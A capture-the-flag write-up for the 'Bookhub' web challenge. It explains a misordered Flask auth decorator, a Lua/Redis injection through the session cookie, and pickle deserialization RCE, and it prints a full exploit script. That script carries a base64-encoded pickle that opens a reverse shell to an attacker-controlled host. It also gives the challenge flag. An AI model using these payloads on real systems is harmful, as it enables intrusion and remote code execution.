# Bookhub (web, 19 solved, 208p)

```
How to pwn bookhub?

http://52.52.4.252:8080/

hint: www.zip
```

In the task we get access to a webpage which displays some books information.
There is also `admin login` page, but doesn't seem to be vulnerable in any way.
We also get the [source code](www.zip).

From the whole source code there are really only 2 things that are of interest:

- `views/user.py`
- `forms/user.py`

## Broken authentication decorator

First vulnerability in the code is:

```python
@login_required
@user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
def refresh_session():
```

It seems just fine, but the `proper` function is for example:

```python
    @user_blueprint.route('/admin/system/change_name/', methods=['POST'])
    @login_required
    def change_name():
```

The difference is the order of decorators!
It seems that re-ordering the decorators actually makes the `login_required` useless, and it doesn't get triggered.
As a result we can call this method, as long as we're running the `debug mode`, since all of this is inside `if app.debug:`

We can at least confirm this to work locally.

## Finding debug server

Another interesting part of the code is:

```python
def validate_password(self, field):
    address = get_remote_addr()
    whitelist = os.environ.get('WHITELIST_IPADDRESS', '127.0.0.1')

    # If you are in the debug mode or from office network (developer)
    if not app.debug and not ip_address_in(address, whitelist):
        raise StopValidation(f'your ip address isn\'t in the {whitelist}.')

    user = User.query.filter_by(username=self.username.data).first()
    if not user or not user.check_password(field.data):
        raise StopValidation('Username or password error.')
```

Whitelist check is particularly important, because once we try to login on the webpage we get back:

```
your ip address isn't in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.
```

What is `18.213.16.123`?
It's not a local address, nor addres of the server we're using.
We scanned this IP and got back few open ports.
One was of particular interest because http://18.213.16.123:5000 was running the same application, but in `debug mode` (indicated by a warning on the main page).

We confirmed that we can trigger `/admin/system/refresh_session/` here, just as on local debug environment.
This was the only available endpoint, so we focused on figuring out how we can use it.

## Redis injection

The endpoint mentioned earlier allows us to delete all user sessions, apart from ours, from Redis.
Redis is a key-value store, and it seems it's storing session information for this particular application.

Code we're interested in is:

```python
    @login_required
    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
    def refresh_session():
        """
        delete all session except the logined user

        :return: json
        """

        status = 'success'
        sessionid = flask.session.sid
        prefix = app.config['SESSION_KEY_PREFIX']

        if flask.request.form.get('submit', None) == '1':
            try:
                rds.eval(rf'''
                local function has_value (tab, val)
                    for index, value in ipairs(tab) do
                        if value == val then
                            return true
                        end
                    end
                
                    return false
                end
                
                local inputs = {{ "{prefix}{sessionid}" }}
                local sessions = redis.call("keys", "{prefix}*")
                
                for index, sid in ipairs(sessions) do
                    if not has_value(inputs, sid) then
                        redis.call("del", sid)
                    end
                end
                ''', 0)
            except redis.exceptions.ResponseError as e:
                app.logger.exception(e)
                status = 'fail'

        return flask.jsonify(dict(status=status))
```

The really interesting part is, the fact that the code is reading the value of our session cookie, and then it's bulding some Lua-Redis code with this value, and then this code is executed by Redis.

But what if we provide session id with `"` inside?
We will break out of `local inputs = {{ "{prefix}{sessionid}" }}` and basically gain a Redis injection!

We could set for example session to:

```
session = 'k",redis.call("set","bookhub:session:k","some value we want"),"'
```

And by executing the mentioned endpoint, we would actually execute:

```
redis.call("set","bookhub:session:k","some value we want")
```

Keep in mind this endpoint removes all sessions, apart form ours, so we provide `k` as our sesion name for `local inputs` variable, and then we set the session with the same name using injection.
This way our session stays in Redis.

We can automate this via script:

```python
session = 'k",redis.call("set","bookhub:session:k",{}),"'.format(inject_session)
url = "http://{}:5000/login/".format(IP)
r = requests.get(url, cookies={"bookhub-session": session})
token = re.findall('<input id="csrf_token" name="csrf_token" type="hidden" value="(.*)">', r.text)[0]
url = "http://{}:5000/admin/system/refresh_session/".format(IP)
r = requests.post(url, data={"csrf_token": token, "submit": "1"}, cookies={"bookhub-session": session})
print(r.text)
```

Keep in mind we need to get a CSRF token for example from `login` page, to be able to submit the POST to `admin/system/refresh_session/`.

Now we can inject a session of our choosing, but the question is: what exactly is the session format and what is stored there?

We have the local debug environment so we could create a user, login and then check what is stored in Redis for his session.
It turns out to be for example

```
b"\x80\x03}q\x00(X\n\x00\x00\x00_permanentq\x01\x88X\x06\x00\x00\x00_freshq\x02\x88X\n\x00\x00\x00csrf_tokenq\x03X(\x00\x00\x003fb61e9f34fe74b112d75ce040a1e202acdd91a0q\x04X\a\x00\x00\x00user_idq\x05X\x01\x00\x00\x001q\x06X\x03\x00\x00\x00_idq\aX\x80\x00\x00\x009fb9e4587a4b3efecccd22ba061e060151bd66fde715982b649fdf4e597ad6f5292bda2812cc59b7c28b0517c45d6a17a235e455eec68e9fb511910a626198e5q\bu."
```

And if we check what serialized is used by default, it turns out to be Pickle.
We can unpickle the session to get back:

```
{'csrf_token': '3fb61e9f34fe74b112d75ce040a1e202acdd91a0', '_fresh': True, 'user_id': '1', '_permanent': True, '_id': '9fb9e4587a4b3efecccd22ba061e060151bd66fde715982b649fdf4e597ad6f5292bda2812cc59b7c28b0517c45d6a17a235e455eec68e9fb511910a626198e5'}
```

## Pickle RCE

There is no point in trying to craft a proper session value, since we already know the server will unpickle whatever we put there.
And pickle can be used for running pretty much any python code we want.
For reference look at:

- https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/gurke_misc_300#eng-version
- https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python

We go with a simple: `cos\nsystem\n(S'touch hacked'\ntR.` to verify it all works locally, and then we sent a simple python reverse shell to the server:

```python
import base64
import re

import requests


def main():
    IP = '18.213.16.123'
    try:
        session_content = base64.b64decode(            'Y3Bvc2l4CnN5c3RlbQpwMQooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgidXJsLndlLmNvbnRyb2xsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7XCcnCnAyCnRScDMKLg==')
        print(session_content)
        inject_session = 'string.char(' + ','.join([str(ord(x)) for x in session_content]) + ')'
        session = 'k",redis.call("set","bookhub:session:k",{}),"'.format(inject_session)
        url = "http://{}:5000/login/".format(IP)
        r = requests.get(url, cookies={"bookhub-session": session})
        token = re.findall('<input id="csrf_token" name="csrf_token" type="hidden" value="(.*)">', r.text)[0]
        url = "http://{}:5000/admin/system/refresh_session/".format(IP)
        r = requests.post(url, data={"csrf_token": token, "submit": "1"}, cookies={"bookhub-session": session})
        print(r.text)
    except Exception as e:
        print(str(e))


main()
```

And we got a reverse shell connection to our server.
From there we could simply look around and find `getflag` command and get the flag: `rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}`
